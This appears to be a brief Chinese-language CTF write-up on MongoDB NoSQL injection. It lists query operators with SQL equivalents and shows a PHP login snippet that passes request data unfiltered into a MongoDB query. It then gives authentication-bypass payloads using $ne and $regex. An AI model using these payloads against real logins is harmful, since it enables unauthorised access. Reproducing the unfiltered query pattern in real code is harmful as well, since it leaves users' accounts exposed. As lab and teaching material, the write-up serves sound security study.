$not: 反匹配(1.3.3及以上版本)
模糊查询用正则式：db.customer.find({'name': {'$regex':'.*s.*'} })
/**
* : 范围查询 { "age" : { "$gte" : 2 , "$lte" : 21}}
* : $ne { "age" : { "$ne" : 23}}
* : $lt { "age" : { "$lt" : 23}}
*/

//查询age = 22的记录
db.userInfo.find({"age": 22});
//相当于：select * from userInfo where age = 22;
//查询age > 22的记录
db.userInfo.find({age: {$gt: 22}});
//相当于：select * from userInfo where age > 22;
```

eg

```php
  //无
  $query = new MongoDB\Driver\Query($data);
  $cursor = $manager->executeQuery('ctfshow.ctfshow_user', $query)->toArray();

//无过滤
  if(count($cursor)>0){
    $ret['msg']='登陆成功';
    array_push($ret['data'], $flag);
  }
```

`username[$ne]=1&password[$ne]=1`
或者正则
`username[$regex]=.*&password[$regex]=.*`
`username[$regex]=^[^a].*$&password[$ne]=1` -> username不以a开头 password不等于1
